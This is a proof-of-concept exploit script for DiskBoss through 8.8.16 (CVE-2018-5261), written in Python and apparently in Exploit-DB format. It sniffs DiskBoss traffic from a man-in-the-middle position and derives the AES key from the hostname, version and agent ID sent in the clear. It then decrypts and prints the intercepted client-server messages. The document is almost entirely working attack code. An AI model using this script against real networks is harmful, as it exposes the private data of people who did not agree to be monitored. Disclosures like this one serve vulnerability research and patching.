# Exploit Title: DiskBoss <= 8.8.16 - Sensitive Information Disclosure
# Date: 2017-08-27
# Exploit Author: Arris Huijgen
# Vendor Homepage: http://www.diskboss.com/
# Software Link: http://www.diskboss.com/setups/diskbossent_setup_v8.8.16.exe
# Version: Through 8.8.16
# Tested on: Kali 2017.2
# CVE: CVE-2018-5261

# Usage
# 1. Place yourself between the Diskboss server and client
# 2. Launch!
# Alternatively you can feed a pcap to this script


from scapy.all import *  # pip install scapy
from struct import pack
import re
import string
import math
import hashlib
from Crypto.Cipher import AES  # pip install pycrypto


# Global variables
aes_key = None
saw_hello = False


def main():
    print '[+] Capture started'
    diskboss_filter = 'tcp port 8094 or port 8096 or port 8097 or port 8098'
    #sniff(offline='capture.pcap', prn=parse_packet, filter=diskboss_filter)
    sniff(iface="eth0", prn=parse_packet, filter=diskboss_filter)


def parse_packet(pkt):
    global aes_key, saw_hello

    # Only PSH/ACK packets are interesting
    if pkt[TCP].fields['flags'] != 0x18:
        return

    # Obtain payload
    payload = pkt[Raw].original
    if payload.startswith(pack('<I', 0xabba1975)):

        # Client hello packet noticed
        if 'SERVER_GET_INFO' in payload:
            saw_hello = True
            return

        # Attempt to extract key
        if saw_hello:
            # Attempt to determine key
            extracted_key = extract_key(payload)

            # Store encryption key
            if extracted_key is not None:
                aes_key = extracted_key
                saw_hello = False
            return

        # If the key is available, attempt to decrypt packets
        if aes_key is not None:
            decrypt_print(payload, aes_key)


def extract_key(msg):
    msg_regex = re.compile('^.*HostName\x01(?P<hostname>\w+)\x011\x01Version\x01(?P<version>([0-9]+\.?)+)\x011\x01AgentId\x01(?P<agentid>[0-9]+)\x01.*$', re.DOTALL)
    groups = msg_regex.search(msg)
    if not groups:
        print 'Error getting key'
        return None

    hostname = groups.group('hostname')
    version = groups.group('version')
    agentid = groups.group('agentid')
    key = '%s_%s_%.8d' % (hostname, version, int(agentid))
    hashed_key = hashlib.sha256(key).digest()

    print '[+] Captured key\nPlain: %s\nSHA256: %s\n' % (key, hashed_key.encode('hex'))

    return hashed_key


def decrypt_print(ciphertext, key):
    # Decrypt
    aes = AES.new(key, AES.MODE_ECB)
    response = ciphertext[24:]  # strip header
    response = response.ljust(int(math.ceil(float(len(response)) / AES.block_size) * AES.block_size), '\x00')  # 16-byte alignment
    decrypted = aes.decrypt(response)

    # Replace non-ascii characters and print
    print '[+] Captured packet\n%s\n' % ''.join(c if c in string.printable else '_' for c in decrypted)


if __name__ == '__main__':
    main()
